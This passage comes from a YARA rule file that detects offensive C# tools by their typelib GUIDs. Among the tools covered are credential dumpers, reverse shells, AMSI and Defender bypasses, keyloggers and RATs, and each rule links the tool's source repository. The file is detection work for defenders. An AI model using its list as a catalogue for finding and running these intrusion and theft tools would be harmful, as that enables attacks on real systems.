red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/Ladon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c335405f-5df2-4c7d-9b53-d65adfbed412\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WhiteListEvasion {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/khr0x40sh/WhiteListEvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"858386df-4656-4a1e-94b7-47f6aa555658\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ec7afd4c-fbc4-47c1-99aa-6ebb05094173\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DarkEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/K1ngSoul/DarkEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0bdb9c65-14ed-4205-ab0c-ea2151866a7f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8568b4c1-2940-4f6c-bf4e-4383ef268be9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ryhanson/ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7266acbb-b10d-4873-9b99-12d2043b1d4e\" ascii nocase wide\n        $typelibguid1 = \"5d9515d0-df67-40ed-a6b2-6619620ef0ef\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Povlsomware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/povlteksttv/Povlsomware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe0d5aa7-538f-42f6-9ece-b141560f7781\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RunShellcode {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zerosum0x0/RunShellcode\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ec18a3-674c-4131-a7f5-acbed034b819\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLoginPrompt {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpLoginPrompt\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c12e69cd-78a0-4960-af7e-88cbd794af97\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Adamantium_Thief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Adamantium-Thief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6104bc9-fea9-4ee9-b919-28156c1f2ede\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PSByPassCLM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/PSByPassCLM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46034038-0113-4d75-81fd-eb3b483f2662\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_physmem2profit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/physmem2profit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"814708c9-2320-42d2-a45f-31e42da06a94\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NoAmci {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/NoAmci\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"352e80ec-72a5-4aa6-aabe-4f9a20393e8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBlock {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SharpBlock\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3cf25e04-27e4-4d19-945e-dadc37c81152\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_nopowershell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/nopowershell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"555ad0ac-1fdb-4016-8257-170a74cb2f55\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LimeLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"068d14ef-f0a1-4f9d-8e27-58b4317830c6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AggressorScripts {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/harleyQu1nn/AggressorScripts\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"afd1ff09-2632-4087-a30c-43591f32e4e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Gopher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/Gopher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b5152683-2514-49ce-9aca-1bc43df1e234\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AVIator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Ch0pin/AVIator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4885a4a3-4dfa-486c-b378-ae94a221661a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_njCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xPh0enix/njCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a87b003-4b43-467b-a509-0c8be05bf5a5\" ascii nocase wide\n        $typelibguid1 = \"80b13bff-24a5-4193-8e51-c62a414060ec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMiniDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6ffccf81-6c3c-4d3f-b15f-35a86d0b497f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CinaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/wearelegal/CinaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8586f5b1-2ef4-4f35-bd45-c6206fdc0ebc\" ascii nocase wide\n        $typelibguid1 = \"fe184ab5-f153-4179-9bf5-50523987cf1f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ToxicEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/ToxicEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1bcfe538-14f4-4beb-9a3f-3f9472794902\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Disable_Windows_Defender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Disable-Windows-Defender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"501e3fdc-575d-492e-90bc-703fb6280ee2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvoke_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dtrizna/DInvoke_PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5a869ab2-291a-49e6-a1b7-0d0f051bef0e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/chango77747/ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"980109e4-c988-47f9-b2b3-88d63fababdc\" ascii nocase wide\n        $typelibguid1 = \"8abe8da1-457e-4933-a40d-0958c8925985\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SharpC2/SharpC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"62b9ee4f-1436-4098-9bc1-dd61b42d8b81\" ascii nocase wide\n        $typelibguid1 = \"d2f17a91-eb2d-4373-90bf-a26e46c68f76\" ascii nocase wide\n        $typelibguid2 = \"a9db9fcc-7502-42cd-81ec-3cd66f511346\" ascii nocase wide\n        $typelibguid3 = \"ca6cc2ee-75fd-4f00-b687-917fa55a4fae\" ascii nocase wide\n        $typelibguid4 = \"a1167b68-446b-4c0c-a8b8-2a7278b67511\" ascii nocase wide\n        $typelibguid5 = \"4d8c2a88-1da5-4abe-8995-6606473d7cf1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SneakyExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HackingThings/SneakyExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"612590aa-af68-41e6-8ce2-e831f7fe4ccc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UrbanBishopLocal {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/UrbanBishopLocal\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"88b8515e-a0e8-4208-a9a0-34b01d7ba533\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cobbr/SharpShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bdba47c5-e823-4404-91d0-7f6561279525\" ascii nocase wide\n        $typelibguid1 = \"b84548dc-d926-4b39-8293-fa0bdef34d49\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EvilWMIProvider {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sunnyc7/EvilWMIProvider\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a4020626-f1ec-4012-8b17-a2c8a0204a4b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_GadgetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/GadgetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"af9c62a1-f8d2-4be0-b019-0a7873e81ea9\" ascii nocase wide\n        $typelibguid1 = \"b2b3adb0-1669-4b94-86cb-6dd682ddbea3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AzureCLI_Extractor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0x09AL/AzureCLI-Extractor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a73cad74-f8d6-43e6-9a4c-b87832cdeace\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UAC_Escaper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/UAC-Escaper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"95359279-5cfa-46f6-b400-e80542a7336a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HTTPSBeaconShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aca853dc-9e74-4175-8170-e85372d5f2a9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AmsiScanBufferBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/AmsiScanBufferBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"431ef2d9-5cca-41d3-87ba-c7f5e4582dd2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellcodeLoader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hzllaga/ShellcodeLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a48fe0e1-30de-46a6-985a-3f2de3c8ac96\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_KeystrokeAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fabriciorissetto/KeystrokeAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f6fec17e-e22d-4149-a8a8-9f64c3c905d3\" ascii nocase wide\n        $typelibguid1 = \"b7aa4e23-39a4-49d5-859a-083c789bfea2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellCodeRunner {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/antman1p/ShellCodeRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"634874b7-bf85-400c-82f0-7f3b4659549a\" ascii nocase wide\n        $typelibguid1 = \"2f9c3053-077f-45f2-b207-87c3c7b8f054\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OffensiveCSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/diljith369/OffensiveCSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c3fbc65-b673-40f0-b1ac-20636df01a85\" ascii nocase wide\n        $typelibguid1 = \"2bad9d69-ada9-4f1e-b838-9567e1503e93\" ascii nocase wide\n        $typelibguid2 = \"512015de-a70f-4887-8eae-e500fd2898ab\" ascii nocase wide\n        $typelibguid3 = \"1ee4188c-24ac-4478-b892-36b1029a13b3\" ascii nocase wide\n        $typelibguid4 = \"5c6b7361-f9ab-41dc-bfa0-ed5d4b0032a8\" ascii nocase wide\n        $typelibguid5 = \"048a6559-d4d3-4ad8-af0f-b7f72b212e90\" ascii nocase wide\n        $typelibguid6 = \"3412fbe9-19d3-41d8-9ad2-6461fcb394dc\" ascii nocase wide\n        $typelibguid7 = \"9ea4e0dc-9723-4d93-85bb-a4fcab0ad210\" ascii nocase wide\n        $typelibguid8 = \"6d2b239c-ba1e-43ec-8334-d67d52b77181\" ascii nocase wide\n        $typelibguid9 = \"42e8b9e1-0cf4-46ae-b573-9d0563e41238\" ascii nocase wide\n        $typelibguid10 = \"0d15e0e3-bcfd-4a85-adcd-0e751dab4dd6\" ascii nocase wide\n        $typelibguid11 = \"644dfd1a-fda5-4948-83c2-8d3b5eda143a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SHAPESHIFTER {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/matterpreter/SHAPESHIFTER\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ddfcaa-66e7-44fd-ad48-9d80d1651228\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Evasor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cyberark/Evasor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1c8849ef-ad09-4727-bf81-1f777bd1aef8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stracciatella {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mgeeky/Stracciatella\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"eaafa0ac-e464-4fc4-9713-48aa9a6716fb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_logger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xxczaki/logger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9e92a883-3c8b-4572-a73e-bb3e61cfdc16\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Internal_Monologue {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/eladshamir/Internal-Monologue\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0c0333db-8f00-4b68-b1db-18a9cacc1486\" ascii nocase wide\n        $typelibguid1 = \"84701ace-c584-4886-a3cf-76c57f6e801a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_GRAT2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/GRAT2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5e7fce78-1977-444f-a18e-987d708a2cff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PowerShdll {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/PowerShdll\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36ebf9aa-2f37-4f1d-a2f1-f2a45deeaf21\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CsharpAmsiBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WayneJLee/CsharpAmsiBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4ab3b95d-373c-4197-8ee3-fe0fa66ca122\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HastySeries {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/obscuritylabs/HastySeries\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8435531d-675c-4270-85bf-60db7653bcf6\" ascii nocase wide\n        $typelibguid1 = \"47db989f-7e33-4e6b-a4a5-c392b429264b\" ascii nocase wide\n        $typelibguid2 = \"300c7489-a05f-4035-8826-261fa449dd96\" ascii nocase wide\n        $typelibguid3 = \"41bf8781-ae04-4d80-b38d-707584bf796b\" ascii nocase wide\n        $typelibguid4 = \"620ed459-18de-4359-bfb0-6d0c4841b6f6\" ascii nocase wide\n        $typelibguid5 = \"91e7cdfe-0945-45a7-9eaa-0933afe381f2\" ascii nocase wide\n        $typelibguid6 = \"c28e121a-60ca-4c21-af4b-93eb237b882f\" ascii nocase wide\n        $typelibguid7 = \"698fac7a-bff1-4c24-b2c3-173a6aae15bf\" ascii nocase wide\n        $typelibguid8 = \"63a40d94-5318-42ad-a573-e3a1c1284c57\" ascii nocase wide\n        $typelibguid9 = \"56b8311b-04b8-4e57-bb58-d62adc0d2e68\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DreamProtectorFree {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Paskowsky/DreamProtectorFree\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f7e8a902-2378-426a-bfa5-6b14c4b40aa3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RedSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/RedSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"30b2e0cf-34dd-4614-a5ca-6578fb684aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ESC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NetSPI/ESC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"06260ce5-61f4-4b81-ad83-7d01c3b37921\" ascii nocase wide\n        $typelibguid1 = \"87fc7ede-4dae-4f00-ac77-9c40803e8248\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Csharp_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Csharp-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5fd7f9fc-0618-4dde-a6a0-9faefe96c8a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_bantam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/gellin/bantam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"14c79bda-2ce6-424d-bd49-4f8d68630b7b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpTask {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpTask\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"13e90a4d-bf7a-4d5a-9979-8b113e3166be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsPlague {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RITRedteam/WindowsPlague\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"cdf8b024-70c9-413a-ade3-846a43845e99\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Misc_CSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/Misc-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d1421ba3-c60b-42a0-98f9-92ba4e653f3d\" ascii nocase wide\n        $typelibguid1 = \"2afac0dd-f46f-4f95-8a93-dc17b4f9a3a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSpray {\n    meta:\n        description = \"Detects c# 